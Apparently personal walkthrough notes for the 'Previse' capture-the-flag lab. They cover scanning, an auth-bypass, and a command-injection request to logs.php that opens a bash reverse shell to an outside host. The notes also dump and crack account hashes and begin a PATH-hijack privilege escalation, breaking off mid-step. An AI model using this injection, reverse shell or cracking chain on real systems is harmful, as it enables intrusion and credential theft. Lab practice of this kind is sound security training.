
```┌──(ed㉿kali)-[~]
└─$ nmap -p- -sSCV 10.10.11.104 --min-rate 999
```
>Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-15 05:40 EST
Stats: 0:01:14 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 97.91% done; ETC: 05:41 (0:00:00 remaining)
Nmap scan report for 10.10.11.104
Host is up (0.077s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-title: Previse Login
|_Requested resource was login.php
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

`sudo dirsearch -u http://10.10.11.104`
>[05:41:34] Starting: 
[05:41:46] 302 -    4KB - /accounts.php  ->  login.php
[05:42:04] 200 -    0B  - /config.php
[05:42:07] 301 -  310B  - /css  ->  http://10.10.11.104/css/
[05:42:09] 302 -    0B  - /download.php  ->  login.php
[05:42:12] 200 -   15KB - /favicon.ico
[05:42:12] 302 -    5KB - /files.php  ->  login.php
[05:42:13] 200 -  168B  - /footer.php
[05:42:16] 200 -  381B  - /header.php
[05:42:20] 200 -  475B  - /js/
[05:42:23] 200 -  768B  - /login.php
[05:42:24] 302 -    0B  - /logout.php  ->  login.php
[05:42:41] 403 -  277B  - /server-status
[05:42:41] 403 -  277B  - /server-status/
[05:42:45] 302 -    3KB - /status.php  ->  login.php


//EAR vunl for this page, set match and replace setting in burp, to catch the following page without auth.
//so that we can access files, config etc.

`http://10.10.11.104/config.php`
```
<php

>function connectDB(){
    $host = 'localhost';
    $user = 'root';
    $passwd = 'mySQL_p@ssw0rd!:)';
    $db = 'previse';
    $mycon = new mysqli($host, $user, $passwd, $db);
    return $mycon;
    }

```
//we view all source codes, 
// use accounts to add a user
//try file_logs.php, luach log.php, with a paramieter delim
//in burp repeater, code injection to ge ta shell, when use repeater, and we have auth

> POST /logs.php HTTP/1.1
Host: 10.10.11.104
Content-Length: 67
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://10.10.11.104
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.11.104/file_logs.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=2mfh665v0ndgmfa0je2hoeq5rp
Connection: keep-alive
delim=%3bbash+-c+'bash+-i+>%26+/dev/tcp/10.10.16.16/4444+0>%261'%3b

`python -c 'import pty;pty.spawn("/bin/bash")'`

//access 3306
`mysql -u root -p 'mySQL_p@ssw0rd!:)' -e 'show databases;'`

// get credential
```
www-data@previse:/var/www/html$ mysql -u root -p'mySQL_p@ssw0rd!:)' -e 'show databases;'
< -u root -p'mySQL_p@ssw0rd!:)' -e 'show databases;'
mysql: [Warning] Using a password on the command line interface can be insecure.
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| previse            |
| sys                |
+--------------------+

www-data@previse:/var/www/html$ mysql -u root -p'mySQL_p@ssw0rd!:)' previse -e 'show tables;'
<oot -p'mySQL_p@ssw0rd!:)' previse -e 'show tables;'
mysql: [Warning] Using a password on the command line interface can be insecure.
Tables_in_previse
accounts
files
```

//plesae mindful of no blank after -p

```www-data@previse:/var/www/html$ mysql -u root -p'mySQL_p@ssw0rd!:)' previse -e 'select * from accounts;'

www-data@previse:/var/www/html$ mysql -u root -p'mySQL_p@ssw0rd!:)' previse -e 'select * from accounts;'
<L_p@ssw0rd!:)' previse -e 'select * from accounts;'
mysql: [Warning] Using a password on the command line interface can be insecure.
id	username	password	created_at
1	m4lwhere	$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.	2021-05-27 18:18:36
2	edward	$1$🧂llol$871XgNliRBU3/rExPTrA1/	2025-12-15 14:06:00
3	testuser	$1$🧂llol$m/usFw4RSzR5LGAWGTe8X0	2025-12-15 14:18:47
```

//put m4lwhere passwd hash in to file hash, hashcat to crack it
`└─$ hashcat -m 500 hash -a 0 ~/oscp/rockyou.txt 

$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235!  

```
─$ ssh m4lwhere@10.10.11.104
m4lwhere@previse:~$ id
uid=1000(m4lwhere) gid=1000(m4lwhere) groups=1000(m4lwhere)
```

```m4lwhere@previse:~$ sudo -l
[sudo] password for m4lwhere: 
User m4lwhere may run the following commands on previse:
    (root) /opt/scripts/access_backup.sh
    
m4lwhere@previse:~$ ls -la /opt/scripts/access_backup.sh
-rwxr-xr-x 1 root root 486 Jun  6  2021 /opt/scripts/access_backup.sh
```
```m4lwhere@previse:~$ cat /opt/scripts/access_backup.sh
#!/bin/bash

# We always make sure to store logs, we take security SERIOUSLY here

# I know I shouldnt run this as root but I cant figure it out programmatically on my account
# This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time

gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz
```

```m4lwhere@previse:/tmp$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
m4lwhere@previse:/tmp$ export PATH:/tmp:PATH
-bash: export: `PATH:/tmp:PATH': not a valid identifier
m4lwhere@previse:/tmp$ export PATH=/tmp:$PATH
m4lwhere@previse:/tmp$ cat $PATH
cat: '/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin': No such file or directory
m4lwhere@previse:/tmp$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

